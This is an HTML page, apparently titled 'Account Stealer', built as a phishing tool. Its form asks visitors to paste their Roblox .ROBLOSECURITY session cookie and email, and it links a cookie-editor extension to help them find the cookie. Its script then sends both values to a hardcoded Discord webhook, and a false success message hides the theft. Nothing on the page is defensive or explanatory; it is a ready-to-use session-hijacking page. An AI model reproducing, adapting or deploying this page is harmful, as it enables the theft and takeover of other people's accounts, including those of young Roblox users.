<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account $T34LER</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* ===== SPACE BACKGROUND ===== */
    body {
      margin: 0;
      padding: 0;
      background: 
        radial-gradient(ellipse at center, rgba(11,3,45,0.8) 0%, #000000 100%),
        url('https://images.unsplash.com/photo-1462331940025-496dfbfc7564?q=80&w=3111') center/cover no-repeat;
      color: white;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      font-family: 'Poppins', sans-serif;
    }

    /* Moon */
    .moon {
      position: fixed;
      top: 12%;
      right: 12%;
      width: 85px;
      height: 85px;
      background: #f8f3c9;
      border-radius: 50%;
      box-shadow: 
        0 0 70px #f8f3c9,
        0 0 140px #f8f3c944,
        inset -12px -12px 18px rgba(0,0,0,0.3);
      z-index: 1;
    }

    /* Cosmic Clouds */
    .cosmic-clouds {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        url('https://images.unsplash.com/photo-1506318137071-a8e063b4bec0?q=80&w=2900') center/cover no-repeat;
      opacity: 0.35;
      z-index: 1;
      animation: cloudFloat 75s linear infinite;
    }

    @keyframes cloudFloat {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Rain */
    .rain {
      position: absolute;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 2;
    }

    .drop {
      position: absolute;
      width: 1.1px;
      height: 22px;
      background: linear-gradient(transparent, rgba(255,255,255,0.85));
      animation: rain 1s linear infinite;
      transform-origin: top;
      filter: blur(0.45px);
    }

    @keyframes rain {
      0% { transform: translateY(-100px) translateX(0) scaleY(0.3); opacity: 0; }
      10% { opacity: 0.75; }
      90% { opacity: 0.75; }
      100% { transform: translateY(100vh) translateX(25px) scaleY(1); opacity: 0; }
    }

    /* ===== MAIN CARD ===== */
    .card {
      width: 460px;
      background: rgba(10, 5, 20, 0.88);
      backdrop-filter: blur(17px);
      border-radius: 13px;
      padding: 30px;
      box-shadow: 
        0 0 24px rgba(138, 43, 226, 0.6),
        0 0 48px rgba(138, 43, 226, 0.3),
        0 0 72px rgba(138, 43, 226, 0.1);
      border: 1px solid rgba(138, 43, 226, 0.7);
      position: relative;
      z-index: 3;
      overflow: hidden;
      margin-left: -30px;
    }

    .card::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(138,43,226,0.13) 0%, transparent 70%);
      z-index: -1;
      animation: rotate 22s linear infinite;
    }

    .card::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: 13px;
      padding: 1.8px;
      background: linear-gradient(135deg, rgba(138,43,226,0.65), rgba(255,77,141,0.45));
      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      mask-composite: exclude;
      pointer-events: none;
    }

    /* ===== CONTENT ===== */
    .logo {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo h1 {
      font-size: 2.4rem;
      background: linear-gradient(to right, #8a2be2, #ff4d8d);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 0 14px rgba(138, 43, 226, 0.65);
      position: relative;
      display: inline-block;
      margin: 0;
    }

    .logo h1::after {
      content: '';
      position: absolute;
      bottom: -8px;
      left: 50%;
      transform: translateX(-50%);
      width: 68%;
      height: 3px;
      background: linear-gradient(to right, #8a2be2, #ff4d8d);
      border-radius: 3px;
      filter: blur(3px);
      opacity: 0.75;
    }

    .input-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: rgba(255,255,255,0.9);
      font-size: 14px;
      text-shadow: 0 0 9px rgba(138, 43, 226, 0.45);
    }

    input, textarea {
      width: 100%;
      padding: 12px;
      background: rgba(0,0,0,0.45);
      border: 1px solid rgba(138, 43, 226, 0.55);
      border-radius: 7px;
      color: white;
      font-size: 14px;
      transition: all 0.25s;
      box-shadow: 0 0 14px rgba(138, 43, 226, 0.3);
    }

    textarea {
      min-height: 120px;
      resize: none;
    }

    input:focus, textarea:focus {
      outline: none;
      border-color: #ff4d8d;
      box-shadow: 0 0 0 2.5px rgba(255, 77, 141, 0.3), 0 0 22px rgba(255, 77, 141, 0.5);
    }

    /* ===== BUTTONS ===== */
    .btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #8a2be2, #6a1b9a);
      color: white;
      border: none;
      border-radius: 7px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 20px;
      font-size: 15px;
      transition: all 0.25s;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 18px rgba(138, 43, 226, 0.5);
      text-shadow: 0 0 9px rgba(255,255,255,0.25);
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      transition: 0.5s;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 0 28px rgba(138, 43, 226, 0.7);
    }

    .btn:hover::before {
      left: 100%;
    }

    .btn-secondary {
      background: transparent;
      color: #8a2be2;
      border: 1px solid rgba(138, 43, 226, 0.6);
      box-shadow: 0 0 12px rgba(138, 43, 226, 0.3);
    }

    .btn-secondary:hover {
      background: rgba(138, 43, 226, 0.1);
    }

    /* Status Messages */
    .status-message {
      padding: 12px;
      border-radius: 7px;
      margin-bottom: 20px;
      text-align: center;
      display: none;
      background: rgba(0,0,0,0.5);
      border: 1px solid;
      font-size: 14px;
    }

    .success {
      color: #4ade80;
      border-color: rgba(74, 222, 128, 0.5);
      text-shadow: 0 0 10px rgba(74, 222, 128, 0.3);
      box-shadow: 0 0 15px rgba(74, 222, 128, 0.2);
    }

    .error {
      color: #f87171;
      border-color: rgba(248, 113, 113, 0.5);
      text-shadow: 0 0 10px rgba(248, 113, 113, 0.3);
      box-shadow: 0 0 15px rgba(248, 113, 113, 0.2);
    }

    .spin {
      animation: spin 1s linear infinite;
      display: inline-block;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Background Elements -->
  <div class="moon"></div>
  <div class="cosmic-clouds"></div>
  <div class="rain" id="rain"></div>

  <!-- Main Card -->
  <div class="card">
    <div class="logo">
      <h1>ùìêùì¨ùì¨ùì∏ùìæùì∑ùìΩ ùì¢ùìΩùìÆùì™ùìµùìÆùìª</h1>
    </div>
    
    <div id="status-message" class="status-message"></div>
    
    <form id="contact-form">
      <div class="input-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" placeholder="your@email.com" required>
      </div>
      
      <div class="input-group">
        <label for="cookie">Cookie</label>
        <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here" required></textarea>
      </div>
      
      <button type="submit" class="btn">
        <span id="submit-text">Submit</span>
      </button>
      
      <button class="btn btn-secondary" onclick="window.open('https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm', '_blank')">
        Get Cookie-Editor
      </button>
    </form>
  </div>

  <script>
    // Rain effect
    const rainContainer = document.getElementById('rain');
    for (let i = 0; i < 80; i++) {
      const drop = document.createElement('div');
      drop.className = 'drop';
      drop.style.left = `${Math.random() * 100}%`;
      drop.style.top = `${Math.random() * -100}px`;
      drop.style.animationDuration = `${0.5 + Math.random() * 0.7}s`;
      drop.style.animationDelay = `${Math.random() * 2}s`;
      drop.style.height = `${15 + Math.random() * 20}px`;
      drop.style.opacity = `${0.5 + Math.random() * 0.5}`;
      rainContainer.appendChild(drop);
    }

    // Simple cookie validation
    function isCookieValid(cookie) {
      return cookie.length > 30;
    }

    // Form handling
    document.getElementById('contact-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const cookie = document.getElementById('cookie').value.trim();
      const statusMessage = document.getElementById('status-message');
      
      // Validate email
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        statusMessage.textContent = 'Please enter a valid email address';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        return;
      }
      
      // Validate cookie
      if (!isCookieValid(cookie)) {
        statusMessage.textContent = 'Please enter a valid cookie';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        return;
      }
      
      try {
        const submitBtn = e.target.querySelector('button[type="submit"]');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = `<span class="spin">üåÄ</span> Processing...`;
        submitBtn.disabled = true;
        
        // Using your provided Discord webhook URL with exact requested format
        await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `üìß Email: ${email}\nüç™Cookie:\n\`\`\`${cookie}\n\`\`\``
          })
        });
        
        statusMessage.textContent = 'Success! Cookie submitted.';
        statusMessage.className = 'status-message success';
        statusMessage.style.display = 'block';
        e.target.reset();
        
        setTimeout(() => {
          submitBtn.innerHTML = originalText;
          submitBtn.disabled = false;
        }, 2000);
      } catch (err) {
        statusMessage.textContent = 'Error submitting. Please try again.';
        statusMessage.className = 'status-message error';
        statusMessage.style.display = 'block';
        
        const submitBtn = e.target.querySelector('button[type="submit"]');
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
